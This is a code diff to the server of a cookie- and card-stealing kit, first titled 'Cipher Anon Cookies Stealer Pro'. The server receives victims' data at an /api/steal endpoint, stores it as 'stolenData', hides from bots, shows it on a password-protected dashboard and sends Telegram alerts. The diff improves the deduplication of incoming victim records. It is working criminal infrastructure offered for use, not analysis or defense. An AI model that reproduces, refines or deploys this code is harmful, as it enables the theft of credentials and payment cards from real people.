@@ -1,6 +1,5 @@
 // ============================================================
-// SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
-// Railway Ready — Full Environment Variable Support
+// SERVER.JS — Cipher Anon v2.0 (Railway Fix)
 // ============================================================
 
 const express = require('express');
@@ -18,7 +17,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// CONFIGURATION — Railway Friendly (Env Vars First)
+// CONFIGURATION
 // ============================================================
 
 const CONFIG_FILE = path.join(__dirname, 'config.json');
@@ -155,11 +154,11 @@ let stolenData = loadData(DATA_FILE);
 let trashData = loadData(TRASH_FILE);
 
 // ============================================================
-// DEDUP
+// DEDUP — Stronger: IP + hostname + userAgent hash
 // ============================================================
 
 const dedupCache = new Map();
-const DEDUP_WINDOW = 60000;
+const DEDUP_WINDOW = 120000; // 2 minutes
 
 function cleanDedup() {
     const now = Date.now();
@@ -168,10 +167,17 @@ function cleanDedup() {
     }
 }
 
-function isDuplicate(ip, hostname) {
+function getDedupKey(ip, hostname, userAgent) {
     let cleanIp = ip;
     if (ip === '::1' || ip === '::ffff:127.0.0.1' || ip === '127.0.0.1') cleanIp = '127.0.0.1';
-    const key = `${cleanIp}|${hostname}`;
+    // Only use first 50 chars of userAgent to avoid too much variation
+    const ua = (userAgent || '').slice(0, 50);
+    return crypto.createHash('md5').update(`${cleanIp}|${hostname}|${ua}`).digest('hex');
+}
+
+function isDuplicate(ip, hostname, userAgent) {
+    const key = getDedupKey(ip, hostname, userAgent);
+    cleanDedup();
     if (dedupCache.has(key)) {
         const ts = dedupCache.get(key);
         if (Date.now() - ts < DEDUP_WINDOW) return true;
@@ -205,14 +211,14 @@ function requireAuth(req, res, next) {
 }
 
 // ============================================================
-// MIDDLEWARE — CORS + JSON + Anti-Bot
+// MIDDLEWARE
 // ============================================================
 
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// Anti-Bot — apply BEFORE routes
+// Anti-Bot
 app.use(antiBot({
     STRENGTH: 'high',
     RATE_LIMIT_MAX: 10,
@@ -221,10 +227,7 @@ app.use(antiBot({
 
 app.post('/__verify', express.json(), handleVerify);
 
-// ============================================================
-// SECURITY HEADERS
-// ============================================================
-
+// Security Headers
 app.use((req, res, next) => {
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
@@ -390,9 +393,10 @@ app.post('/api/steal', async (req, res) => {
         data.cards = data.cards || [];
 
         const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
+        const userAgent = data.fingerprint?.userAgent || '';
 
-        cleanDedup();
-        if (isDuplicate(ip, hostname)) {
+        // ---- STRONG DEDUP CHECK ----
+        if (isDuplicate(ip, hostname, userAgent)) {
             log(`[!] Duplicate from ${ip} for ${hostname} — ignored`);
             return res.json({ status: 'ok', duplicate: true });
         }
@@ -593,7 +597,6 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
 // FRONTEND ROUTES
 // ============================================================
 
-// ---- Public Routes (No Auth Required) ----
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
@@ -611,7 +614,6 @@ app.get('/home.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
 
-// ---- Protected Routes (Auth Required) ----
 app.get('/dashboard', requireAuth, (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
@@ -622,14 +624,9 @@ app.get('/password-success.php', requireAuth, (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
 });
 
-// ============================================================
-// SERVE .PHP FILES — BLOCK DIRECT ACCESS
-// ============================================================
-
+// ---- Serve .php files with auth check ----
 app.get('*.php', (req, res, next) => {
     const filePath = path.join(__dirname, 'public', req.path);
-    
-    // Public .php files (no auth required)
     const publicPhp = ['/login.php', '/home.php'];
     
     if (publicPhp.includes(req.path)) {
@@ -640,7 +637,6 @@ app.get('*.php', (req, res, next) => {
         return next();
     }
     
-    // ALL other .php files require authentication
     if (!req.session || !req.session.authenticated) {
         return res.redirect('/login.php');
     }
@@ -659,10 +655,7 @@ app.get('*.php', (req, res, next) => {
     }
 });
 
-// ============================================================
-// STATIC FILES FALLBACK
-// ============================================================
-
+// ---- Static files fallback ----
 app.use((req, res, next) => {
     const filePath = path.join(__dirname, 'public', req.path);
     if (fs.existsSync(filePath) && !req.path.startsWith('/api')) {
@@ -672,10 +665,7 @@ app.use((req, res, next) => {
     next();
 });
 
-// ============================================================
-// 404 HANDLER
-// ============================================================
-
+// ---- 404 Handler ----
 app.use((req, res) => {
     if (req.path.startsWith('/api')) {
         res.status(404).json({ status: 'error', message: 'API endpoint not found' });
@@ -684,10 +674,7 @@ app.use((req, res) => {
     }
 });
 
-// ============================================================
-// ERROR HANDLER
-// ============================================================
-
+// ---- Error Handler ----
 app.use((err, req, res, next) => {
     console.error('[!] Error:', err.message);
     if (req.path.startsWith('/api')) {
@@ -712,8 +699,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Health: http://localhost:${PORT}/health`);
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
     console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
-    console.log(`  [+] Session Timeout: 30 minutes`);
-    console.log(`  [+] Dedup: IP + hostname, 60s window`);
+    console.log(`  [+] Dedup: IP + hostname + UA, 2min window`);
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
     console.log('='.repeat(55) + '\n');
